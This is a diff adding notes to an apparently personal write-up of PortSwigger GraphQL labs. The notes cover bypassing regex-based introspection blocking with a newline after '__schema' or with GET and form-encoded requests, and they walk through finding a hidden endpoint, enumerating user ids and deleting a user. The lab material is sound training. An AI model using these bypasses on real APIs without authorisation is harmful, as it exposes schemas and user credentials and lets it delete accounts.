@@ -363,3 +363,142 @@ Notice that it returned `administrator` user's password in the response body. Lo
 Navigate to "Admin panel" and delete user `carlos` to solve the lab. 
 
 > NOTE: Check out [walkthrough](graphql_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
+## Bypassing GraphQL introspection defenses
+
+If you're unable to execute introspection queries on the API you're testing, try adding a special character after the `__schema` keyword. 
+
+When developers disable introspection, they might use a regex to block the `__schema` keyword in queries. You can experiment with characters like spaces, new lines, and commas, as these are ignored by GraphQL but may still be caught by faulty regex filtering. 
+
+For example, if the developer has only excluded `__schema{`, the following introspection query could bypass the restriction:
+
+```graphql
+#Introspection query with newline
+
+{
+    "query": "query{__schema
+    {queryType{name}}}"
+}
+```
+
+If this approach doesn't work, you can try running the probe using an alternative request method. Introspection might only be disabled for `POST` requests, so you could attempt a `GET` request or a `POST` request with a `content-type` of `x-www-form-urlencoded`. 
+
+### Bypassing GraphQL introspection defenses - Continued
+
+The example below shows an introspection probe sent via `GET`, with URL encoded parameters:
+
+```
+# Introspection probe as GET request
+
+GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+```
+
+> NOTE: You can save GraphQL queries to the site map. 
+
+### Lab: Finding a hidden GraphQL endpoint
+
+In Burp's browser navigate to the lab. In __Proxy__ > __HTTP history__ find the very first `GET /` request, right-click it and send it to __Repeater__. 
+
+Send requests to some common GraphQL endpoint suffixes and inspect the results. This is what I tried:
+
+`POST /graphql/v1`:
+
+```
+HTTP/2 404 Not Found
+...
+
+"Not Found"
+```
+
+`POST /graphql`:
+
+```
+HTTP/2 404 Not Found
+...
+
+"Not Found"
+```
+
+`POST /api`:
+
+```
+HTTP/2 405 Method Not Allowed
+Allow: GET
+Content-Type: application/json; charset=utf-8
+...
+
+"Method Not Allowed"
+```
+
+Looks like we found the endpoint and it allows only `GET` requests. So the next thing I tried was `GET /api`:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+...
+
+"Query not present"
+```
+
+This suggests that `/api` GraphQL endpoint might respond to `GET` requests with specific queries. Let's try some:
+
+```
+GET /api?query=query{__typename} HTTP/2
+```
+
+Returns:
+
+```
+{
+  "data": {
+    "__typename": "query"
+  }
+}
+```
+
+Now right-click the request pane in __Repeater__ and select "GraphQL" > "Set introspection query. This will add an introspection query string to the `GET /api` request. Click Send:
+```
+{
+  "errors": [
+    {
+      "locations": [],
+      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
+    }
+  ]
+}
+```
+
+The message reads "introspection is not allowed". Let's try adding a newline character after `__schema` and resend. A newline character has to be URL encoded as `%0a` so it would look like `__schema%0a+%` in the query. 
+
+Now the response includes the full introspection details. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query. 
+
+Now in __Repeater__ right-click the response panel and select "GraphQL" > "Save GraphQL queries to site map". 
+
+Go to __Target__ > __Site map__ and drop down the tree on the left pane to __`api`__. Find a `getUser` query (you can do this by clicking on the request and changing to _GraphQL_ tab, where it cleans up the notation:
+
+```graphql
+query($id: Int!) {
+  getUser(id: $id) {
+    id
+    username
+  }
+}
+```
+
+But it is also quite visible in the Request panel if your eyes can handle it:
+
+```
+GET /api?query=query%28%24id%3a+Int%21%29+%7b%0a++getUser%28id%3a+%24id%29+%7b%0a++++id%0a++++username%0a++%7d%0a%7d&variables=%7b%22id%22%3a0%7d HTTP/1.1
+```
+
+> NOTE: Once you send the following request to Repeater and send it might return a "Body cannot be empty" message. Right-click request panel and select "Change request method" so it changes to `POST` and then do it again, to change back to `GET`. It should work then. 
+
+If you can spot a `getUser` query in there, right-click the request and send to __Repeater__. Change to the __GraphQL__ tab and there you can see that in the __Variables__ panel the `id` variable is set to `0` which returns `null`. Change the `id` variable's value and send until it returns credentials of user `carlos`. It appears `id` for carlos is `3`.
+
+Go back to __Target__ > __Site map__ and find another request with a GraphQL query `deleteOrganizationUser`. Notice that this mutation takes `id` as a parameter. Send this request to __Repeater__. 
+
+In Repeater, change to GraphQL tab and edit `id` variable and set it to `3`. Send the request to solve the lab. 
+
+> NOTE: Check out [walkthrough](graphql_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
+
